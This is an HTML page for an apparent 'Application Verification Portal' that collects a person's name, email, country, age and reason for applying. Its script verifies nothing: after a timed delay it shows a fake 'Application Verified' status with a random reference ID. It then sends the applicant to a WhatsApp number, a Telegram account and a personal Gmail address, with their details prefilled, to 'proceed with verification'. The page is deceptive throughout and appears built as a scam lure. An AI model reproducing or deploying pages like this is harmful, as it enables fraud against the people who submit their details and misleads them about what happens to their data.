<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application Verification Portal</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  color: white;
  text-align: center;
}

.container {
  max-width: 480px;
  margin: 40px auto;
  background: white;
  color: black;
  padding: 25px;
  border-radius: 14px;
  box-shadow: 0 12px 30px rgba(0,0,0,0.3);
}

h1 {
  font-size: 22px;
}

.sub {
  font-size: 13px;
  color: gray;
  margin-bottom: 20px;
}

input, select, textarea {
  width: 92%;
  padding: 12px;
  margin: 8px 0;
  border: 1px solid #ddd;
  border-radius: 8px;
  font-size: 14px;
}

textarea {
  height: 80px;
  resize: none;
}

button {
  width: 95%;
  padding: 12px;
  background: #1db954;
  border: none;
  color: white;
  font-weight: bold;
  border-radius: 8px;
  cursor: pointer;
  margin-top: 10px;
}

button:hover {
  background: #17a44a;
}

.status {
  margin-top: 15px;
  font-weight: bold;
  color: #1db954;
}

.small {
  font-size: 12px;
  color: gray;
  margin-top: 10px;
}

.links a {
  display: block;
  margin-top: 10px;
  padding: 10px;
  background: #111;
  color: white;
  border-radius: 8px;
  text-decoration: none;
}
</style>
</head>

<body>

<div class="container">

  <h1>Application Verification Portal</h1>
  <p class="sub">
    Submit your application for eligibility review and verification processing
  </p>

  <!-- FORM INPUTS WITH IDS -->
  <input id="name" type="text" placeholder="Full Legal Name">
  <input id="email" type="email" placeholder="Email Address">
  <input id="country" type="text" placeholder="Country of Residence">

  <select id="age">
    <option value="">Select Age Range</option>
    <option>18–24</option>
    <option>25–34</option>
    <option>35–44</option>
    <option>45+</option>
  </select>

  <textarea id="reason" placeholder="Why are you applying for this program?"></textarea>

  <button onclick="submitForm()">Submit Application</button>

  <p class="small">
    All applications are processed through a secure verification system.
  </p>

  <!-- STATUS OUTPUT -->
  <div class="status" id="status"></div>

  <!-- SUPPORT LINKS (WITH IDS FOR JS) -->
  <div class="links" id="links" style="display:none;">

    <p><b>Verification Support Center</b></p>

    <a id="waLink" target="_blank">WhatsApp Support</a>
    <a id="tgLink" target="_blank">Telegram Support</a>
    <a id="mailLink">Email Verification Unit</a>

  </div>

</div>

<!-- JAVASCRIPT -->
<script>
function submitForm() {

  let name = document.getElementById("name").value;
  let email = document.getElementById("email").value;
  let country = document.getElementById("country").value;
  let age = document.getElementById("age").value;
  let reason = document.getElementById("reason").value;

  if(!name || !email || !country || !age || !reason){
    alert("Please complete all required fields");
    return;
  }

  document.getElementById("status").innerText =
    "Submitting application for verification...";

  setTimeout(() => {

    let token = "APP-" + Math.random().toString(36).substring(2,8).toUpperCase();

    document.getElementById("status").innerText =
      "Application Verified ✔ | Reference ID: " + token;

    document.getElementById("links").style.display = "block";

    // message for support
    let message =
      "Hello Support Team,%0A%0A" +
      "My application has been processed successfully.%0A%0A" +
      "Full Name: " + name + "%0A" +
      "Email: " + email + "%0A" +
      "Country: " + country + "%0A%0A" +
      "Reference ID (Token): " + token + "%0A%0A" +
      "Kindly proceed with verification.";

    // WhatsApp
    document.getElementById("waLink").href =
      "https://wa.me/18732804513?text=" + message;

    // Telegram
    document.getElementById("tgLink").href =
      "https://t.me/miacwr";

    // Email
    document.getElementById("mailLink").href =
      "mailto:miacarterxoxo17@gmail.com?subject=Application%20Verification&body=" + message;

  }, 3000);
}
</script>

</body>
</html>
